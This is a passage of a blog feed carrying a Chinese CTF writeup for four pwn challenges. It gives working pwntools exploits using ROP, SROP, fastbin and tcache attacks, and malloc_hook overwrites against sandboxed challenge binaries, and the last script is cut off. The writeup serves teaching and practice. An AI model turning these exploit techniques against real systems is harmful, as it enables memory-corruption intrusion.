&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: 